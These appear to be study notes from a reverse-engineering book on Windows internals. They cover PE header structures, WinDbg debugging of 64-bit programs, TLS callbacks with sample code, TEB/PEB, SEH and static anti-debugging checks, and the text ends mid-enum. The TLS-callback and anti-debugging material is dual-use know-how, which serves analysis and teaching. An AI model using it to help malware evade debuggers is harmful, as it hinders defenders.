0x014c#define IMAGE_FILE_MACHINE_R3000        0x0162#define IMAGE_FILE_MACHINE_R4000        0x0166#define IMAGE_FILE_MACHINE_R10000       0x0168#define IMAGE_FILE_MACHINE_WCEMIPSV2    0x0169#define IMAGE_FILE_MACHINE_ALPHA        0x0184#define IMAGE_FILE_MACHINE_SH3          0x01a2#define IMAGE_FILE_MACHINE_SH3DSP       0x01a3#define IMAGE_FILE_MACHINE_SH3E         0x01a4#define IMAGE_FILE_MACHINE_SH4          0x01a6#define IMAGE_FILE_MACHINE_SH5          0x01a8#define IMAGE_FILE_MACHINE_ARM          0x01c0#define IMAGE_FILE_MACHINE_THUMB        0x01c2#define IMAGE_FILE_MACHINE_ARMNT        0x01c4#define IMAGE_FILE_MACHINE_AM33         0x01d3#define IMAGE_FILE_MACHINE_POWERPC      0x01f0#define IMAGE_FILE_MACHINE_POWERPCFP    0x01f1#define IMAGE_FILE_MACHINE_IA64         0x0200#define IMAGE_FILE_MACHINE_MIPS16       0x0266#define IMAGE_FILE_MACHINE_ALPHA64      0x0284#define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64#define IMAGE_FILE_MACHINE_MIPSFPU      0x0366#define IMAGE_FILE_MACHINE_MIPSFPU16    0x0466#define IMAGE_FILE_MACHINE_TRICORE      0x0520#define IMAGE_FILE_MACHINE_CEF          0x0cef#define IMAGE_FILE_MACHINE_EBC          0x0ebc#define IMAGE_FILE_MACHINE_CHPE_X86     0x3a64#define IMAGE_FILE_MACHINE_AMD64        0x8664#define IMAGE_FILE_MACHINE_M32R         0x9041#define IMAGE_FILE_MACHINE_ARM64EC      0xa641#define IMAGE_FILE_MACHINE_ARM64X       0xa64e#define IMAGE_FILE_MACHINE_ARM64        0xaa64#define IMAGE_FILE_MACHINE_RISCV32      0x5032#define IMAGE_FILE_MACHINE_RISCV64      0x5064#define IMAGE_FILE_MACHINE_RISCV128     0x5128#define IMAGE_FILE_MACHINE_CEE          0xc0ee//Source: //Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h\n\nIMAGE_OPTIONAL_HEADERtypedef struct _IMAGE_OPTIONAL_HEADER &#123;  /* Standard fields */  WORD  Magic; /* 0x10b or 0x107 */\t/* 0x00 */  BYTE  MajorLinkerVersion;  BYTE  MinorLinkerVersion;  DWORD SizeOfCode;  DWORD SizeOfInitializedData;  DWORD SizeOfUninitializedData;  DWORD AddressOfEntryPoint;\t\t/* 0x10 */  DWORD BaseOfCode;  DWORD BaseOfData;  /* NT additional fields */  DWORD ImageBase;  DWORD SectionAlignment;\t\t/* 0x20 */  DWORD FileAlignment;  WORD  MajorOperatingSystemVersion;  WORD  MinorOperatingSystemVersion;  WORD  MajorImageVersion;  WORD  MinorImageVersion;  WORD  MajorSubsystemVersion;\t\t/* 0x30 */  WORD  MinorSubsystemVersion;  DWORD Win32VersionValue;  DWORD SizeOfImage;  DWORD SizeOfHeaders;  DWORD CheckSum;\t\t\t/* 0x40 */  WORD  Subsystem;  WORD  DllCharacteristics;  DWORD SizeOfStackReserve;  DWORD SizeOfStackCommit;  DWORD SizeOfHeapReserve;\t\t/* 0x50 */  DWORD SizeOfHeapCommit;  DWORD LoaderFlags;  DWORD NumberOfRvaAndSizes;  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; /* 0x60 */  /* 0xE0 */&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;typedef struct _IMAGE_OPTIONAL_HEADER64 &#123;  WORD  Magic; /* 0x20b */  BYTE MajorLinkerVersion;  BYTE MinorLinkerVersion;  DWORD SizeOfCode;  DWORD SizeOfInitializedData;  DWORD SizeOfUninitializedData;  DWORD AddressOfEntryPoint;  DWORD BaseOfCode;  ULONGLONG ImageBase;  DWORD SectionAlignment;  DWORD FileAlignment;  WORD MajorOperatingSystemVersion;  WORD MinorOperatingSystemVersion;  WORD MajorImageVersion;  WORD MinorImageVersion;  WORD MajorSubsystemVersion;  WORD MinorSubsystemVersion;  DWORD Win32VersionValue;  DWORD SizeOfImage;  DWORD SizeOfHeaders;  DWORD CheckSum;  WORD Subsystem;  WORD DllCharacteristics;  ULONGLONG SizeOfStackReserve;  ULONGLONG SizeOfStackCommit;  ULONGLONG SizeOfHeapReserve;  ULONGLONG SizeOfHeapCommit;  DWORD LoaderFlags;  DWORD NumberOfRvaAndSizes;  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;/* Possible Magic values */#define IMAGE_NT_OPTIONAL_HDR32_MAGIC      0x10b#define IMAGE_NT_OPTIONAL_HDR64_MAGIC      0x20b#define IMAGE_ROM_OPTIONAL_HDR_MAGIC       0x107#ifdef _WIN64#define IMAGE_SIZEOF_NT_OPTIONAL_HEADER IMAGE_SIZEOF_NT_OPTIONAL64_HEADER#define IMAGE_NT_OPTIONAL_HDR_MAGIC     IMAGE_NT_OPTIONAL_HDR64_MAGIC#else#define IMAGE_SIZEOF_NT_OPTIONAL_HEADER IMAGE_SIZEOF_NT_OPTIONAL32_HEADER#define IMAGE_NT_OPTIONAL_HDR_MAGIC     IMAGE_NT_OPTIONAL_HDR32_MAGIC#endif//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h\n\nStack &amp; Heaptypedef struct _IMAGE_THUNK_DATA64 &#123;\tunion &#123;\t\tULONGLONG ForwarderString;\t\tULONGLONG Function;\t\tULONGLONG Ordinal;\t\tULONGLONG AddressOfData;\t&#125; u1;&#125; IMAGE_THUNK_DATA64,*PIMAGE_THUNK_DATA64;#pragma pack(pop)typedef struct _IMAGE_THUNK_DATA32 &#123;\tunion &#123;\t\tDWORD ForwarderString;\t\tDWORD Function;\t\tDWORD Ordinal;\t\tDWORD AddressOfData;\t&#125; u1;&#125; IMAGE_THUNK_DATA32,*PIMAGE_THUNK_DATA32;//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h\n\nIMAGE_IMPORT_DESCRIPTORtypedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;\tunion &#123;\t\tDWORD\tCharacteristics; /* 0 for terminating null import descriptor  */\t\tDWORD\tOriginalFirstThunk;\t/* RVA to original unbound IAT */\t&#125; DUMMYUNIONNAME;\tDWORD\tTimeDateStamp;\t/* 0 if not bound,\t\t\t\t * -1 if bound, and real date\\time stamp\t\t\t\t *    in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT\t\t\t\t * (new BIND)\t\t\t\t * otherwise date/time stamp of DLL bound to\t\t\t\t * (Old BIND)\t\t\t\t */\tDWORD\tForwarderChain;\t/* -1 if no forwarders */\tDWORD\tName;\t/* RVA to IAT (if bound this IAT has actual addresses) */\tDWORD\tFirstThunk;&#125; IMAGE_IMPORT_DESCRIPTOR,*PIMAGE_IMPORT_DESCRIPTOR;\nChapter 39 - WinDbg\n\n\nChapter 40 - 64-bit Debugging40.1 - Debugger on x64 Platform\n\n\n\nOS\nPE32\nPE32+\n\n\n\n\n32-bit\nOllyDbg, IDA Pro, WinDbg\nIDA Pro (Disassemble only)\n\n\n64-bit\nOllyDbg, IDA Pro, WinDbg\nIDA Pro, WinDbg\n\n\n\n\n40.2 - x64 DebuggingWOW64Test#include &quot;stdio.h&quot;#include &quot;windows.h&quot;#include &quot;Shlobj.h&quot;#include &quot;tchar.h&quot;#pragma comment(lib, &quot;Shell32.lib&quot;)int _tmain(int argc, TCHAR* argv[])&#123;    HKEY    hKey                = NULL;    HANDLE  hFile               = INVALID_HANDLE_VALUE;    TCHAR   szPath[MAX_PATH]    = &#123;0,&#125;;    ////////////////    // system32 folder    if( GetSystemDirectory(szPath, MAX_PATH) )    &#123;        _tprintf(L&quot;1) system32 path = %s\\n&quot;, szPath);    &#125;    ////////////////    // File size    _tcscat_s(szPath, L&quot;\\\\kernel32.dll&quot;);    hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL,                        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);    if( hFile != INVALID_HANDLE_VALUE )    &#123;        _tprintf(L&quot;2) File size of \\&quot;%s\\&quot; = %d\\n&quot;,         szPath, GetFileSize(hFile, NULL));        CloseHandle(hFile);    &#125;    ////////////////    // Program Files    if( SHGetSpecialFolderPath(NULL, szPath,                                CSIDL_PROGRAM_FILES, FALSE) )    &#123;        _tprintf(L&quot;3) Program Files path = %s\\n&quot;, szPath);    &#125;    ////////////////    // Registry    if( ERROR_SUCCESS == RegCreateKey(HKEY_LOCAL_MACHINE,                                       L&quot;SOFTWARE\\\\ReverseCore&quot;, &amp;hKey) )    &#123;        RegCloseKey(hKey);        _tprintf(L&quot;4) Create Registry Key : HKLM\\\\SOFTWARE\\\\ReverseCore\\n&quot;);    &#125;    return 0;&#125;\n40.3 - WOW64Test_x86.exe\n    \n    Run code.\n    \n\n\n\n    \n    Enable \"x64 Compatibility-mode [single-step]\n    \n\n\n\n    \n    Startup\n    \n\n\n\n    \n    main() function.\n    \n\n\n40.4 - WOW64Test_x64.exeWe use WinDbg to debug this executableFile -&gt; Launch Executable\nFirstly, we need to obtain the EP address.&gt; !dh WOW64Test_x64\n\n    \n    Display PE header.\n    \n\n\nGo into EP:&gt; g WOW64Test_x64 + 142C\n\n    \n    Go into EP.\n    \n\n\nShow more instructions:&gt; u eip L10\n\n    \n    Display more instructions.\n    \n\n\nTrace the jmp instruction at 00000001 40001439&gt; g WOW64Test_x64 + 12b4&gt; u eip L60\n\n    \n    Trace function\n    \n\n\n\nmain() function&gt; bp KERNEL32!GetCommandLineW&gt; g\n\n    \n    Set breakpoint.\n    \n\n\nObtain the return address from stack&gt; r rsp&gt; dq rsp\n\n    \n    View register, and then dump the register.\n    \n\n\n&gt; g 00000001`40001381&gt; u eip L20\n\n    \n    Go to the address that we obtained, this is the main() function that we want since the return address is the address of main function. The assembly code above is the assembly code of main().\n    \n\n\n&gt; g 00000001`400013ea&gt; r\n\n    \n    Arguments.\n    \n\n\n&gt; db rdx\n\n    \n    Dump rdx to show argument.\n    \n\n\n&gt; db rdx\n\n    \n    Dump r8 to show stack pointers.\n    \n\n\n&gt; db 023b3ac0 l200\n\n    \n    Dump the stack. The address 023b3ac0 is the address of the first element of the array of last result (`db rdx`). Always remember little-endian is used.\n    \n\n\nChapter 41 - ASLRASLR stands for Address Space Layout Randomization.\nWindows OS that apply ASLR:\n\n\n\n\nOS\nKernal Version\n\n\n\n\nWindows 2000\n5.0\n\n\nWindows XP\n5.1\n\n\nWindows Server 2003\n5.2\n\n\nWindows Vista\n6.0\n\n\nWindows Server 2008\n6.0\n\n\nWindows Server 2008 R2\n6.1\n\n\nWindows 7\n6.1\n\n\n\n\nIMAGE_FILE_HEADER\\Characteristics\nIMAGE_FILE_RELOCS_STRIPPED\nChapter 42 - Session of Kernel 6Session 0 Isolation\nChapter 43 - DLL Injection in Kernel 6Chapter 44 - InjDll.exe——A Tool for DLL InjectionChapter 45 - TLS Callback FunctionFrom this point on, this book will introduce more advanced topics in reverse engineering.\nHere, TLS stands for Thread Local Storage, instead of Transport Layer Security used in networking.\nTLS Callback Function is commonly used in anti-debugging.\n45.1 - Practice#1 HelloTls.exe\n    \n    Running HelloTls.exe\n    \n\n\n\n    \n    Debugging HelloTls.exe\n    \n\n\n\n    \n    OllyDbg: HelloTls.exe is terminated.\n    \n\n\n45.2 - TLS\n    \n    IMAGE_NT_HEADERS\\IMAGE-OPTIOAL_HEADER\\IMAGE_DATA_DIRECTORY[9] -> TLS Table\n    \n\n\ntypedef struct _IMAGE_TLS_DIRECTORY64 &#123;    ULONGLONG   StartAddressOfRawData;    ULONGLONG   EndAddressOfRawData;    ULONGLONG   AddressOfIndex;    ULONGLONG   AddressOfCallBacks;    DWORD       SizeOfZeroFill;    DWORD       Characteristics;&#125; IMAGE_TLS_DIRECTORY64, *PIMAGE_TLS_DIRECTORY64;typedef struct _IMAGE_TLS_DIRECTORY32 &#123;    DWORD   StartAddressOfRawData;    DWORD   EndAddressOfRawData;    DWORD   AddressOfIndex;    DWORD   AddressOfCallBacks;    DWORD   SizeOfZeroFill;    DWORD   Characteristics;&#125; IMAGE_TLS_DIRECTORY32, *PIMAGE_TLS_DIRECTORY32;#ifdef _WIN64typedef IMAGE_TLS_DIRECTORY64           IMAGE_TLS_DIRECTORY;typedef PIMAGE_TLS_DIRECTORY64          PIMAGE_TLS_DIRECTORY;#elsetypedef IMAGE_TLS_DIRECTORY32           IMAGE_TLS_DIRECTORY;typedef PIMAGE_TLS_DIRECTORY32          PIMAGE_TLS_DIRECTORY;#endif//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h\n\n    \n    IMAGE_TLS_DIRECTORY\n    \n\n\nAddressOfCallbacks stores an array of pointers which point to callback functions. It is a significant member in structure IMAGE_TLS_DIRECTORY. The array is ended with NULL value.\n\n    \n    PEView.exe: AddressOfCallbacks\n    \n\n\nNotice that we can register multiple TLS callback functions by modifying the program, even though the original program contains only one TLS callback.\n45.3 - TLS Callback FunctionA TLS callback function is invoked whenever a process thread is created or terminated.When the main thread is created, the TLS callback is executed before the program’s entry point (EP).This behavior can be leveraged for anti-debugging purposes.\nNotice that the TLS callback function is invoked when the program is terminated.\nIMAGE_TLS_CALLBACKtypedef VOID (CALLBACK *PIMAGE_TLS_CALLBACK)(\tLPVOID DllHandle,    DWORD Reason,    LPVOID Reserved);//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h\nNotice that the definition of TLS callback function is similar to DllMain():BOOL WINAPI DllMain(  _In_ HINSTANCE hinstDLL,  _In_ DWORD     fdwReason,  _In_ LPVOID    lpvReserved);//Source: https://learn.microsoft.com/en-us/windows/win32/dlls/dllmainThe TLS callback function and DllMain() have the same parameter order.For a callback function, DllHandle is the address of the module (its load address), and Reason indicates why the callback function is being invoked.\nThere are four possible values for Reason:/* Argument 1 passed to the DllEntryProc. */#define\tDLL_PROCESS_DETACH\t0\t/* detach process (unload library) */#define\tDLL_PROCESS_ATTACH\t1\t/* attach process (load library) */#define\tDLL_THREAD_ATTACH\t2\t/* attach new thread */#define\tDLL_THREAD_DETACH\t3\t/* detach thread *///Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h\n45.4 - Practice#2 TlsTest.exe#include &lt;windows.h&gt;#pragma comment(linker, &quot;/INCLUDE:__tls_used&quot;)void print_console(char* szMsg)&#123;    HANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);    WriteConsoleA(hStdout, szMsg, strlen(szMsg), NULL, NULL);&#125;void NTAPI TLS_CALLBACK1(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123;    char szMsg[80] = &#123;0,&#125;;    wsprintfA(szMsg, &quot;TLS_CALLBACK1() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason);    print_console(szMsg);&#125;void NTAPI TLS_CALLBACK2(PVOID DllHandle, DWORD Reason, PVOID Reserved)&#123;    char szMsg[80] = &#123;0,&#125;;    wsprintfA(szMsg, &quot;TLS_CALLBACK2() : DllHandle = %X, Reason = %d\\n&quot;, DllHandle, Reason);    print_console(szMsg);&#125;#pragma data_seg(&quot;.CRT$XLX&quot;)    PIMAGE_TLS_CALLBACK pTLS_CALLBACKs[] = &#123; TLS_CALLBACK1, TLS_CALLBACK2, 0 &#125;;#pragma data_seg()DWORD WINAPI ThreadProc(LPVOID lParam)&#123;    print_console(&quot;ThreadProc() start\\n&quot;);    print_console(&quot;ThreadProc() end\\n&quot;);    return 0;&#125;int main(void)&#123;    HANDLE hThread = NULL;    print_console(&quot;main() start\\n&quot;);    hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);    WaitForSingleObject(hThread, 60*1000);    CloseHandle(hThread);    print_console(&quot;main() end\\n&quot;);    return 0;&#125;\nThe calling order of TLS function:\n\nDLL_PROCESS_ATTACH\nDLL_THREAD_ATTACH\nDLL_THREAD_DETACH\nDLL_PROCESS_DETACH\n\n\n    \n    TlsTest.exe\n    \n\n\n45.5 - Debugging TLS Callback FunctionEnable “System breakpoint”:\n\n    \n    Debugging options -> Events -> System breakpoint\n    \n\n\n\n\n\nOr using Olly Advanced:\n\n    \n    Plugin -> Plly Advanced -> Anti-Debug 2 -> Break on TLS Callback\n    \n\n\n\n\n\n45.6 - Manually Add TLS Callback Function.Before modification:\n\n\n\nModification:\n\n\n\n\n\n\n\n    \n    Modifying .rsrc section header.\n    \n\n\n\n    \n    HxD: IMAGE_DATA_DIRECTORY\n    \n\n\n\n    \n    PEView: IMAGE_DATA_DIRECTORY\n    \n\n\nWrite the assembly code:\n\n    \n    OllyDbg: Copy to executable -> Selection -> Save file.\n    \n\n\n\n    \n    OllyDbg: Save file.\n    \n\n\n\n    \n    Testing\n    \n\n\nChapter 46 - TEBTEB stands for Thread Environment Block.\nWe can view TEB structure using the following command in WinDbg:&gt; dt _TEB\n\n    \n    Members of TEB\n    \n\n\nThere are two important members:\n\n+0x030 ProcessEnvironmentBlock: Ptr32 _PEB\\This pointer points to PEB (Introduces in next chapter) .\nNtTib\\TIB stands for Thread Information Block, this is the definition of TIB:typedef struct _NT_TIB&#123;     struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList;     PVOID StackBase;     PVOID StackLimit;     PVOID SubSystemTib;     union &#123;         PVOID FiberData;         DWORD Version;     &#125; DUMMYUNIONNAME;     PVOID ArbitraryUserPointer;     struct _NT_TIB *Self;&#125; NT_TIB, *PNT_TIB;\n\n\n46.2 - Accessing TEBNtdll.NtCurrentTeb()FS Segment RegisterFS segment register indicates the TEB structure of the current thread.\n\nFS:[0x18] = start address of TEB\n  \\begin{align*}\n  FS:[0x18] &= TEB.NtTib.Self\\\\\n  &= Address of TIB\\\\\n  &= Address of TEB FS:0 \\\\\n  &= 7FFDF000\n  \\end{align*}\nFS:[0X30] = start address of PEB\n  \\begin{align*}\n  FS:[0x30] &= TEB.ProcessEnvironmentBlock\\\\\n  &= Address of PEB\n  \\end{align*}\nFS:[0] = start address of SEH\n  \\begin{align*}\n  FS:[0] &= TEB.NtTib.ExceptionList\\\\\n  &= Address of SEH\n  \\end{align*}\n\nChapter 47 - PEB47.1 - PEBAccessing PEBPEB stands for Process Environment Block.PEB structure stores information of process.\nWe execute the following instruction in OllyDby (F7 or F8) at EP:MOV EAX,DWORD PTR FS:[0x30]\n\n    \n    EAX\n    \n\n\nDefinition of PEBtypedef struct _PEB &#123;  BYTE                          Reserved1[2];  BYTE                          BeingDebugged;  BYTE                          Reserved2[1];  PVOID                         Reserved3[2];  PPEB_LDR_DATA                 Ldr;  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;  PVOID                         Reserved4[3];  PVOID                         AtlThunkSListPtr;  PVOID                         Reserved5;  ULONG                         Reserved6;  PVOID                         Reserved7;  ULONG                         Reserved8;  ULONG                         AtlThunkSListPtr32;  PVOID                         Reserved9[45];  BYTE                          Reserved10[96];  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;  BYTE                          Reserved11[128];  PVOID                         Reserved12[1];  ULONG                         SessionId;&#125; PEB, *PPEB;\nMembers of PEBWindows 10\n\n    \n    EAX\n    \n\n\n47.2 - Important Members+002 BeginDebugged : UChar+008 ImageBaseAddress : Ptr32 Void+00c Ldr : Ptr32 _PEB_LDR_DATA+018 ProcessHeap : Ptr32 Void+068 NtGlobalFlag : Uint4B\n\nPEB.BeginDebugged:\\This value is commonly used in anti-debugging.\nPEB.ImageBaseAddress:\\This value indicates the ImageBase of the process. We use GetModuleHandle() to obtain ImageBase.\nPEB.Ldr:\\This member is a pointer that points to _PEB_LDR_DATA structure. After a DLL has been loaded into a process, we can obtain the ImageBase of the module through PEB.Ldr.\nPEB.ProcessHeap &amp; PEB.NtGlobalFlag:\\These two values are commonly used in anti-debugging.\n\nChapter 48 - SEH48.1 - SEHSEH stands for Structured Exception Handling.\nSEH is the exception handling mechanism used in Windows. In practice, we use keywords such as __try, __except, __finally to implement exception handling. Additionally, this mechanism is widely used in anti-debugging techniques.\nNotice that the structure of SEH is different from the try / catch mechanism in C++. Windows introduced the SEH mechanism first, and it was later integrated into Visual C++. In other words, SEH is a low-level exception handling mechanism supported by the Windows operating system and the Visual C++ compiler.\n\n    \n    Exception.\n    \n\n\n\n    \n    Memory: Address 0 is undefined.\n    \n\n\n48.4 - ExceptionThere are 5 types of common exceptions:\n\nEXCEPTION_ACCESS_VIOLATION(C0000005)\nEXCEPTION_BREAKPOINT(80000003)\nEXCEPTION_ILLEGAL_INSTRUCTION(C000001D)\nEXCEPTION_INT_DIVIDE_BY_ZERO(C0000094)\nEXCEPTION_SINGLE_STEP(80000004)\n\n48.5 - Details of SEHSEH Chaintypedef struct _EXCEPTION_REGISTRATION_RECORD&#123;     PEXCEPTION_REGISTRATION_RECORD Next;     PEXCEPTION_DISPOSITION Handler;&#125; EXCEPTION_REGISTRATION_RECORD, *PEXCEPTION_REGISTRATION_RECORD;//Source: https://maple19out.tistory.com/72\n\n    \n    Source: https://maple19out.tistory.com/72\n    \n\n\nDefinition of Exception HandlerTEB.NtTib.ExceptionListUsing SEH48.6 - Practice#2 - seh.exeChapter 49 - IA-32 Instruction49.2 - Terminology\n\n\n\nTerminology\nDescription\n\n\n\n\nMachine Language\n\n\nInstruction\n\n\nOpCode\n\n\nAssembly\n\n\nAssemble\n\n\nAssembler\n\n\nDisassemble\n\n\nDisassembler\n\n\nDisassembly\n\n\n*Compile\n\n\n*Link\n\n\n\n\n49.3 - IA-32 Instruction Format\n    \n    Source: https://www.researchgate.net/figure/A-32-general-instruction-format_fig1_265265229\n    \n\n\nInstruction PrefixOpcodeModR/MSIBSIB (Scale-Index-Base) is also an optional field.\nDeplacementImmediate49.4 - Instruction Analyzing49.5 - PracticeChapter 50 - Anti-Debugging50.1 Anti-DebuggingAnti-Debugging techniques are strongly dependent to OS and debugger.\n50.2 - Anti-Anti-Debugging50.3 - Types of Anti-DebuggingStatic Anti-DebuggingStatic anti-debugging is used to detect a debugger. If a debugger is detected, the process cannot execute normally. Once the static anti-debugging technique is cracked, the program can execute normally.\nDynamic Anti-DebuggingEven though we have cracked the static anti-debugging technique, we may still encounter difficulties. If a dynamic anti-debugging technique is applied, it becomes difficult to trace instructions because this technique interferes with the debugger.\nChapter 51 - Static Anti-Debugging Techniques51.2 - PEBPEB is used for detecting a debugger. It provides reliable and convenient information. This technique is commonly used in anti-debugging.\nBeingDebugged (+0x2)Ldr (+0xC)Process Heap (+0x18)\nGetPocessHeap()\nFlags (+0xC) &amp; Force Flags (+0x10)\n\nNtGlobalFlag (+0x68)51.3 - NtQueryInformationProcess()__kernel_entry NTSTATUS NtQueryInformationProcess(  [in]            HANDLE           ProcessHandle,  [in]            PROCESSINFOCLASS ProcessInformationClass,  [out]           PVOID            ProcessInformation,  [in]            ULONG            ProcessInformationLength,  [out, optional] PULONG           ReturnLength);//Source: https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess\ntypedef enum _PROCESSINFOCLASS&#123;    ProcessBasicInformation,                        // q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION    ProcessQuotaLimits,                             // qs: QUOTA_LIMITS, QUOTA_LIMITS_EX    ProcessIoCounters,                              // q: IO_COUNTERS    ProcessVmCounters,                              // q: VM_COUNTERS, VM_COUNTERS_EX, VM_COUNTERS_EX2    ProcessTimes,                                   // q: KERNEL_USER_TIMES    ProcessBasePriority,                            // s: KPRIORITY    ProcessRaisePriority,                           // s: ULONG    ProcessDebugPort,                               // q: HANDLE    ProcessExceptionPort,                           // s: PROCESS_EXCEPTION_PORT (requires SeTcbPrivilege)    ProcessAccessToken,                             // s: PROCESS_ACCESS_TOKEN    ProcessLdtInformation,                          // qs: PROCESS_LDT_INFORMATION // 10    ProcessLdtSize,                                 // s: PROCESS_LDT_SIZE    ProcessDefaultHardErrorMode,                    // qs: ULONG    ProcessIoPortHandlers,                          // s: PROCESS_IO_PORT_HANDLER_INFORMATION // (kernel-mode only)    ProcessPooledUsageAndLimits,                    // q: POOLED_USAGE_AND_LIMITS    ProcessWorkingSetWatch,                         // q: PROCESS_WS_WATCH_INFORMATION[]; s: void    ProcessUserModeIOPL,                            // qs: ULONG (requires SeTcbPrivilege)    ProcessEnableAlignmentFaultFixup,               // s: BOOLEAN    ProcessPriorityClass,                           // qs: PROCESS_PRIORITY_CLASS    ProcessWx86Information,                         // qs: ULONG (requires SeTcbPrivilege) (VdmAllowed)    ProcessHandleCount,                             // q: ULONG, PROCESS_HANDLE_INFORMATION // 20    ProcessAffinityMask,                            // qs: KAFFINITY, qs: GROUP_AFFINITY    ProcessPriorityBoost,                           // qs: ULONG    ProcessDeviceMap,                               // qs: PROCESS_DEVICEMAP_INFORMATION, PROCESS_DEVICEMAP_INFORMATION_EX    ProcessSessionInformation,                      // q: PROCESS_SESSION_INFORMATION    ProcessForegroundInformation,                   // s: PROCESS_FOREGROUND_BACKGROUND    ProcessWow64Information,                        // q: ULONG_PTR    ProcessImageFileName,                           // q: UNICODE_STRING    ProcessLUIDDeviceMapsEnabled,                   // q: ULONG    ProcessBreakOnTermination,                      // qs: ULONG    ProcessDebugObjectHandle,                       // q: HANDLE // 30    ProcessDebugFlags,                              // qs: ULONG    ProcessHandleTracing,                           // q: PROCESS_HANDLE_TRACING_QUERY; s: PROCESS_HANDLE_TRACING_ENABLE[_EX] or void to disable    ProcessIoPriority,                              // qs: IO_PRIORITY_HINT    ProcessExecuteFlags,                            // qs: ULONG (MEM_EXECUTE_OPTION_*)    ProcessTlsInformation,                          // qs: PROCESS_TLS_INFORMATION // ProcessResourceManagement    ProcessCookie,                                  // q: ULONG    ProcessImageInformation,                        // q: SECTION_IMAGE_INFORMATION    ProcessCycleTime,                               // q: PROCESS_CYCLE_TIME_INFORMATION // since VISTA    ProcessPagePriority,                            // qs: PAGE_PRIORITY_INFORMATION    ProcessInstrumentationCallback,                 // s: PVOID or PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION // 40    ProcessThreadStackAllocation,                   // s: PROCESS_STACK_ALLOCATION_INFORMATION, PROCESS_STACK_ALLOCATION_INFORMATION_EX    ProcessWorkingSetWatchEx,                       // q: PROCESS_WS_WATCH_INFORMATION_EX[]; s: void    ProcessImageFileNameWin32,                      // q: UNICODE_STRING    ProcessImageFileMapping,                        // q: HANDLE (input)    ProcessAffinityUpdateMode,                      // qs: PROCESS_AFFINITY_UPDATE_MODE    ProcessMemoryAllocationMode,                    // qs: PROCESS_MEMORY_ALLOCATION_MODE    ProcessGroupInformation,                        // q: USHORT[]    ProcessTokenVirtualizationEnabled,              // s: ULONG    ProcessConsoleHostProcess,                      // qs: ULONG_PTR // ProcessOwnerInformation    ProcessWindowInformation,                       // q: PROCESS_WINDOW_INFORMATION // 50    ProcessHandleInformation,                       // q: PROCESS_HANDLE_SNAPSHOT_INFORMATION // since WIN8    ProcessMitigationPolicy,                        // s: PROCESS_MITIGATION_POLICY_INFORMATION    ProcessDynamicFunctionTableInformation,         // s: PROCESS_DYNAMIC_FUNCTION_TABLE_INFORMATION    ProcessHandleCheckingMode,                      // qs: ULONG; s: 0 disables, otherwise enables    ProcessKeepAliveCount,                          // q: PROCESS_KEEPALIVE_COUNT_INFORMATION    ProcessRevokeFileHandles,                       // s: PROCESS_REVOKE_FILE_HANDLES_INFORMATION    ProcessWorkingSetControl,                       // s: PROCESS_WORKING_SET_CONTROL    ProcessHandleTable,                             // q: ULONG[] // since WINBLUE    ProcessCheckStackExtentsMode,                   // qs: ULONG // KPROCESS-&gt;CheckStackExtents (CFG)    ProcessCommandLineInformation,                  // q: UNICODE_STRING // 60    ProcessProtectionInformation,                   // q: PS_PROTECTION    ProcessMemoryExhaustion,                        // s: PROCESS_MEMORY_EXHAUSTION_INFO // since THRESHOLD    ProcessFaultInformation,                        // s: PROCESS_FAULT_INFORMATION    ProcessTelemetryIdInformation,                  // q: PROCESS_TELEMETRY_ID_INFORMATION    ProcessCommitReleaseInformation,                // qs: PROCESS_COMMIT_RELEASE_INFORMATION    ProcessDefaultCpuSetsInformation,               // qs: SYSTEM_CPU_SET_INFORMATION[5] // ProcessReserved1Information    ProcessAllowedCpuSetsInformation,               // qs: SYSTEM_CPU_SET_INFORMATION[5] // ProcessReserved2Information    ProcessSubsystemProcess,                        // s: void // EPROCESS-&gt;SubsystemProcess    ProcessJobMemoryInformation,                    // q: PROCESS_JOB_MEMORY_INFO    ProcessInPrivate,                               // q: BOOLEAN; s: void // ETW // since THRESHOLD2 // 70    ProcessRaiseUMExceptionOnInvalidHandleClose,    // qs: ULONG; s: 0 disables, otherwise enables    ProcessIumChallengeResponse,                    // q: PROCESS_IUM_CHALLENGE_RESPONSE    ProcessChildProcessInformation,                 // q: PROCESS_CHILD_PROCESS_INFORMATION    ProcessHighGraphicsPriorityInformation,         // q: BOOLEAN; s: BOOLEAN (requires SeTcbPrivilege)    ProcessSubsystemInformation,                    // q: SUBSYSTEM_INFORMATION_TYPE // since REDSTONE2    ProcessEnergyValues,                            // q: PROCESS_ENERGY_VALUES, PROCESS_EXTENDED_ENERGY_VALUES, PROCESS_EXTENDED_ENERGY_VALUES_V1    ProcessPowerThrottlingState,                    // qs: POWER_THROTTLING_PROCESS_STATE    ProcessActivityThrottlePolicy,                  // qs: PROCESS_ACTIVITY_THROTTLE_POLICY // ProcessReserved3Information    ProcessWin32kSyscallFilterInformation,          // q: WIN32K_SYSCALL_FILTER    ProcessDisableSystemAllowedCpuSets,             // s: BOOLEAN // 80    ProcessWakeInformation,                         // q: PROCESS_WAKE_INFORMATION // (kernel-mode only)    ProcessEnergyTrackingState,                     // qs: 